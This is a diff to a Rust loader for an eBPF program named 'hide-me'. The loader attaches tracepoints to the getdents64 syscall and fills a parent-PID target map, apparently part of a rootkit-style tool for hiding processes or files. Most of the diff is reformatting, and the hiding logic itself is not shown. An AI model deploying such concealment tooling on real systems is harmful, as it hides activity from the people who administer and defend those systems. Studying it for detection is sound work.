@@ -1,4 +1,9 @@
-use aya::{Bpf, include_bytes_aligned, maps::{array::ProgramArray, HashMap}, programs::TracePoint};
+use aya::{
+    include_bytes_aligned,
+    maps::{array::ProgramArray, HashMap},
+    programs::TracePoint,
+    Bpf,
+};
 use aya_log::BpfLogger;
 use clap::Parser;
 use log::{debug, info, warn};
@@ -31,18 +36,19 @@ async fn main() -> Result<(), anyhow::Error> {
     // like to specify the eBPF program at runtime rather than at compile-time, you can
     // reach for `Bpf::load_file` instead.
     #[cfg(debug_assertions)]
-        let mut bpf = Bpf::load(include_bytes_aligned!(
+    let mut bpf = Bpf::load(include_bytes_aligned!(
         "../../target/bpfel-unknown-none/debug/hide-me"
     ))?;
+
     #[cfg(not(debug_assertions))]
-        let mut bpf = Bpf::load(include_bytes_aligned!(
+    let mut bpf = Bpf::load(include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/hide-me"
     ))?;
+
     if let Err(e) = BpfLogger::init(&mut bpf) {
         // This can happen if you remove all log statements from your eBPF program.
         warn!("failed to initialize eBPF logger: {}", e);
     }
-
 
     let mut target_ppid: HashMap<_, u8, i32> =
         HashMap::try_from(bpf.map_mut("target_ppid").unwrap())?;
@@ -51,7 +57,7 @@ async fn main() -> Result<(), anyhow::Error> {
 
     let program: &mut TracePoint = bpf.program_mut("hide_me").unwrap().try_into()?;
     program.load()?;
-    program.attach("syscalls", "sys_exit_getdents64")?;
+    program.attach("syscalls", "sys_enter_getdents64")?;
 
     let mut prog_array = ProgramArray::try_from(bpf.take_map("JUMP_TABLE").unwrap())?;
     let prog_0: &mut TracePoint = bpf
@@ -59,6 +65,8 @@ async fn main() -> Result<(), anyhow::Error> {
         .unwrap()
         .try_into()?;
     prog_0.load()?;
+    prog_0.attach("syscalls", "sys_exit_getdents64")?;
+
     let prog_0_fd = prog_0.fd().unwrap();
     prog_array.set(0, prog_0_fd, 0).unwrap();
 
@@ -69,7 +77,6 @@ async fn main() -> Result<(), anyhow::Error> {
     prog_1.load()?;
     let prog_1_fd = prog_1.fd().unwrap();
     prog_array.set(1, prog_1_fd, 0).unwrap();
-
 
     info!("Waiting for Ctrl-C...");
     signal::ctrl_c().await?;
